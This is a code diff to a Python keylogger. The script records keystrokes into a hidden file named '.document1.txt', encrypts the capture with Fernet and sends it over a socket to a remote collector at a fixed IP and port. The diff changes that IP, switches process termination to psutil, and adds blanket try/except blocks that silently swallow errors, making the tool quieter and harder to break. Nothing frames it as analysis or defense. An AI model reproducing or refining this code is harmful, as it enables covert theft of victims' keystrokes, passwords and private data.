@@ -5,6 +5,7 @@ import os
 from datetime import datetime
 from cryptography.fernet import Fernet
 import signal
+import psutil
 
 def get_filename():
     now = datetime.now()
@@ -25,8 +26,8 @@ def kill_server():
     if os.name == "nt":
         os._exit(1)
     else:
-        os.kill(os.getpid(), signal.SIGINT)
-
+        p = psutil.Process(os.getpid())
+        p.terminate()
 def stop_and_delete_capture_file():
     file = ".document1.txt" 
     os.remove(file)
@@ -53,13 +54,18 @@ def send_file_securely(client_socket):
             client_socket.send(encrypted_lines)
             file.close()
             del file
+    except Exception:
+        pass
             
     finally:
         client_socket.close()
 
 if __name__ == "__main__":
-    mysocket = get_socket("192.168.1.16", 12345)
-    launch_keylogger(mysocket)
+    try:
+        mysocket = get_socket("192.168.1.13", 12345)
+        launch_keylogger(mysocket)
+    except Exception:
+        pass
 
     """
     try:
